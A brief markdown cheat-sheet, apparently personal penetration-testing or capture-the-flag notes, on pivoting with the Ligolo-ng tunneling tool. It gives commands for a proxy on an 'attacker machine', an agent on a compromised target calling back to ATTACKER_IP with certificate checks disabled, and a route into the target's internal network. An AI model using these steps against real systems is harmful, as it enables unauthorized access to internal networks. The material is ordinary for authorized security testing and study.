# Ligolo

Traffic networking tool

## Usage

Attacker machine

```shell
ligon #Custom Alias
sudo ./proxy --selfcert
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!
WARN[0000] Using self-signed certificates
INFO[0000] Listening on 0.0.0.0:<PORT>
```

Target machine

```shell
./agent -connect ATTACKER_IP:<PORT> -ignore-cert
WARN[0000] warning, certificate validation disabled
INFO[0000] Connection established 
```

Once we good a connection in the proxy server we execute

```shell
ligolo-ng » session
? Specify a session : 1 - root@casino - ... - ...
[Agent : root@casino] » start
INFO[0101] Starting tunnel to root@casino
```

And in the end we do `sudo ip route add ... dev ligolo`

Now we should be able to connect to internal route that is going through the target machine